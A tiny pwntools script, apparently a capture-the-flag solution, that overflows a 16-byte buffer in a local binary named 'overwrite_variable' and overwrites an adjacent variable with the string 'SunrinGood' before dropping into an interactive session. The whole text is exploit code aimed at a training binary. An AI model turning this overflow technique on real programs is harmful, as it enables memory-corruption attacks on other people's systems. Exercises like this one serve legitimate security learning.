from pwn import *

p = process('./overwrite_variable')

payload = 'A'*0x10
payload += "SunrinGood"

p.send(payload)
p.interactive()
